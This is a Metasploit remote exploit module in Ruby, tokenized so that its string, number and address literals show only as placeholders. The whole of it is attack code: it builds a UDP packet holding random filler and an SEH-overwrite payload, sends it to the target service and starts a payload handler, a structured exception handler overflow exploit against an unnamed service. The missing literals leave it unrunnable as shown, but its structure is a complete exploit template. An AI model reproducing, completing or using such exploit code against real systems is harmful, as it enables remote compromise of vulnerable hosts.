require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: Udp include Msf :: Exploit :: Remote :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def exploit connect_udp user = rand_text_english ( <int> , payload_badchars ) port = rand ( <int> ) . to_s filler = rand_text_english ( <int> , payload_badchars ) seh = generate_seh_payload ( target . ret ) filler [ <int> , seh . length ] = seh sploit = <str> user <str> + <str> sploit << <str> rhost <str> rport <str> + <str> sploit << <str> rhost <str> port <str> + <str> sploit << <str> user <str> rhost <str> port <str> + <str> sploit << <str> ( rand ( <int> ) + <int> ) <str> rhost <str> + <str> sploit << <str> + filler + <str> sploit << <str> + <str> sploit << <str> port <str> + <str> print_status ( <str> target . name <str> ) udp_sock . put ( sploit ) handler disconnect_udp end end 
